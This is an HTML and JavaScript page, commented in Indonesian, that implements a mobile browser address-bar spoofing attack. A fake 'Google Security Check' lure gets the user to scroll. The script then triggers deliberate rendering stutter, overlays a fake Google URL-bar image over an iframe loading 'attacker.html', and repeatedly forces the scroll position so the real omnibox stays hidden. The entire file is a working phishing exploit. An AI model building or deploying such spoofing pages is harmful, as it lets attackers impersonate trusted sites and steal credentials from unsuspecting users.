<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
    <title>azzzab</title>
    <style>
      html, body {
        margin: 0; padding: 0; width: 100%; height: 250vh; 
        background-color: #f8f9fa; overflow-x: hidden;
        overscroll-behavior-y: none !important; /* MATIKAN ELASTIC BOUNCE */
      }

      /* Kunci layar biar gak bisa ditarik pas spoofing aktif */
      .lock-all {
        height: 100vh !important;
        overflow: hidden !important;
        touch-action: none !important;
      }

      #scroll-bait {
        display: flex; flex-direction: column; align-items: center;
        justify-content: center; height: 100vh; text-align: center;
      }

      #fake-ui {
        display: none; position: fixed; top: 0; left: 0;
        width: 100vw; height: 100vh; z-index: 99999; background: #fff;
      }

      #fake-bar {
        position: absolute;
        bottom: 0; /* Target: Omnibox Bawah */
        left: 0; width: 100%; height: 56px;
        object-fit: contain; border-top: 1px solid #ddd;
        z-index: 100; opacity: 0; pointer-events: none;
      }

      #fake-content {
        position: absolute; top: 0; left: 0;
        width: 100%; height: calc(100vh - 56px); border: none;
      }

      /* GPU Killer Versi Ringan: Biar gak nge-lag parah */
      #gpu-lite {
        position: fixed; top: 0; left: 0; width: 1px; height: 1px;
        pointer-events: none; z-index: 1;
      }
    </style>
  </head>
  <body>

    <div id="scroll-bait">
      <h2>Google Security Check</h2>
      <p>Scroll down slowly to verify.</p>
      <div style="font-size: 50px; color: #1a73e8;">↓</div>
    </div>

    <div id="gpu-lite"></div>

    <div id="fake-ui">
      <img id="fake-bar" src="urlbar-google.jpg" />
      <iframe id="fake-content" src="attacker.html"></iframe>
    </div>

    <script>
      let isSpoofed = false;

      // Versi Ringan: 300 div aja udah cukup buat bikin stutter di Android
      function lightStutter() {
        const killer = document.getElementById("gpu-lite");
        for (let i = 0; i < 300; i++) {
          let div = document.createElement("div");
          div.style.cssText = `position:absolute; width:100vw; height:2vh; backdrop-filter:blur(5px); opacity:0.01;`;
          killer.appendChild(div);
        }
        // Busy-wait dikurangi jadi 200ms biar gak ANR (Application Not Responding)
        let start = Date.now();
        while (Date.now() - start < 200) {} 
      }

      window.addEventListener("scroll", () => {
          if (window.scrollY > 50 && !isSpoofed) {
            isSpoofed = true;
            
            lightStutter();
            
            document.getElementById("fake-ui").style.display = "block";
            document.body.classList.add('lock-all'); // PASANG GEMBOK CSS

            // Tendang ke koordinat tengah agar Omnibox asli ngumpet
            window.scrollTo(0, 50);

            setTimeout(() => {
              document.getElementById("gpu-lite").innerHTML = "";
            }, 500);
          }
      }, { passive: false });

      window.addEventListener("message", (e) => {
        if (e.data === "SNAP_TRAP") {
          let fakeBar = document.getElementById("fake-bar");
          fakeBar.style.opacity = "1";
          
          // RE-ANCHOR: Tiap kali user nyoba narik mentok, tendang balik!
          setInterval(() => {
            if(isSpoofed) {
              const pos = window.scrollY;
              // Kalau mau mentok atas atau mentok bawah (Bottom Bar Danger Zone)
              if (pos < 5 || pos > 80) {
                  window.scrollTo(0, 40);
              }
            }
          }, 30);
        }
      });

      // Blokir total input di gambar palsu
      const fb = document.getElementById("fake-bar");
      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
          fb.addEventListener(evt, (e) => e.preventDefault(), { passive: false });
      });

    </script>
  </body>
</html>
